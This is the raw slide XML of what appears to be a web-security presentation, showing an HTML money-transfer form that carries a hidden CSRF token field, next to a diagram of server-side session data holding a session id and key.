              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"POST"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-25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dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>action</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"/transfer"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="763905">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;input</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="800000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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>type</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"text"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"to"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-50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dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>""</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="763905">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;input</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-55">
                <a:solidFill>
                  <a:srgbClr val="800000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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>type</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"number"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-45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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"amount"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-40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dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>""</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="763905">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;input</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-65">
                <a:solidFill>
                  <a:srgbClr val="800000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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>type</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"hidden"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-65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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>name</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"csrf"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-65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dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"x5è1€"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="763905">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="5"/>
              </a:spcBef>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;input</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-45">
                <a:solidFill>
                  <a:srgbClr val="800000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E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>type</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"submit"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-45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dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="E40000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>value</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="0000FF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>"submit"</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="512445">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/form&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
          <a:p>
            <a:pPr marL="262255">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/body&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="180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</a:pPr>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="800000"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>&lt;/html&gt;</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="5" name="object 5" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8752078" y="1741677"/>
            <a:ext cx="2564130" cy="3284854"/>
            <a:chOff x="8752078" y="1741677"/>
            <a:chExt cx="2564130" cy="3284854"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="6" name="object 6" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8758428" y="1748027"/>
              <a:ext cx="2551430" cy="3272154"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2551429" h="3272154">
                  <a:moveTo>
                    <a:pt x="2459736" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="91440" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55828" y="7179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26765" y="26765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7179" y="55828"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="91439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="3180588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7179" y="3216199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26765" y="3245262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55828" y="3264848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91440" y="3272028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459736" y="3272028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495347" y="3264848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2524410" y="3245262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2543996" y="3216199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2551176" y="3180588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2551176" y="91439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2543996" y="55828"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2524410" y="26765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495347" y="7179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459736" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="00637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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8758428" y="1748027"/>
              <a:ext cx="2551430" cy="3272154"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2551429" h="3272154">
                  <a:moveTo>
                    <a:pt x="0" y="91439"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="7179" y="55828"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26765" y="26765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55828" y="7179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91440" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459736" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495347" y="7179"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2524410" y="26765"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2543996" y="55828"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2551176" y="91439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2551176" y="3180588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2543996" y="3216199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2524410" y="3245262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2495347" y="3264848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2459736" y="3272028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="91440" y="3272028"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="55828" y="3264848"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="26765" y="3245262"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7179" y="3216199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="3180588"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="91439"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="00252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" name="object 8" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8864345" y="1792300"/>
            <a:ext cx="1179195" cy="3003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solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-3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800" spc="-20">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>data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9" name="object 9" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8904478" y="2188210"/>
            <a:ext cx="2274570" cy="1318895"/>
            <a:chOff x="8904478" y="2188210"/>
            <a:chExt cx="2274570" cy="1318895"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="10" name="object 10" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8910828" y="2194560"/>
              <a:ext cx="2261870" cy="1306195"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2261870" h="1306195">
                  <a:moveTo>
                    <a:pt x="2214753" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="46863" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28610" y="3679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13716" y="13715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3679" y="28610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="46862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1259204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3679" y="1277457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13716" y="1292352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28610" y="1302388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46863" y="1306067"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2214753" y="1306067"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2233005" y="1302388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2247900" y="1292352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2257936" y="1277457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2261616" y="1259204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2261616" y="46862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2257936" y="28610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2247900" y="13715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2233005" y="3679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2214753" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="D7003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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8910828" y="2194560"/>
              <a:ext cx="2261870" cy="1306195"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2261870" h="1306195">
                  <a:moveTo>
                    <a:pt x="0" y="46862"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3679" y="28610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13716" y="13715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28610" y="3679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46863" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2214753" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2233005" y="3679"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2247900" y="13715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2257936" y="28610"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2261616" y="46862"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2261616" y="1259204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2257936" y="1277457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2247900" y="1292352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2233005" y="1302388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2214753" y="1306067"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="46863" y="1306067"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="28610" y="1302388"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13716" y="1292352"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3679" y="1277457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="1259204"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="46862"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="5A000E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2" name="object 12" descr=""/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9003538" y="2228850"/>
            <a:ext cx="205613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solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>Session</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-5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FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Calibri"/>
                <a:cs typeface="Calibri"/>
              </a:rPr>
              <a:t>id:</a:t>
            </a:r>
            <a:r>
              <a:rPr dirty="0" sz="1800" spc="-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800" spc="-10">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
                <a:latin typeface="Consolas"/>
                <a:cs typeface="Consolas"/>
              </a:rPr>
              <a:t>ah5…f435</a:t>
            </a:r>
            <a:endParaRPr sz="1800">
              <a:latin typeface="Consolas"/>
              <a:cs typeface="Consolas"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="13" name="object 13" descr=""/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="8984742" y="2572004"/>
            <a:ext cx="2065655" cy="287020"/>
            <a:chOff x="8984742" y="2572004"/>
            <a:chExt cx="2065655" cy="287020"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="14" name="object 14" descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8991092" y="2578353"/>
              <a:ext cx="2052955" cy="274320"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2052954" h="274319">
                  <a:moveTo>
                    <a:pt x="2052624" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1026337" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="274320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1026287" y="274320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2052624" y="274320"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2052624" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="D7003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 descr=""/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr>
            <a:xfrm>
              <a:off x="8984742" y="2578354"/>
              <a:ext cx="2065655" cy="274320"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst/>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="l" t="t" r="r" b="b"/>
              <a:pathLst>
                <a:path w="2065654" h="274319">
                  <a:moveTo>
                    <a:pt x="0" y="274320"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2065401" y="274320"/>
                  </a:lnTo>
                </a:path>
                <a:path w="2065654" h="274319">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2065401" y="0"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:ln w="12700">
              <a:solidFill>
                <a:srgbClr val="D70031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aphicFrame>
        <p:nvGraphicFramePr>
          <p:cNvPr id="16" name="object 16" descr=""/>
          <p:cNvGraphicFramePr>
            <a:graphicFrameLocks noGrp="1"/>
          </p:cNvGraphicFramePr>
          <p:nvPr/>
        </p:nvGraphicFramePr>
        <p:xfrm>
          <a:off x="8984742" y="2565654"/>
          <a:ext cx="2141855" cy="82867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889635"/>
                <a:gridCol w="1163319"/>
              </a:tblGrid>
              <a:tr h="280670"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dirty="0" sz="1200" spc="-25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Key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43180">
                    <a:lnL w="12700">
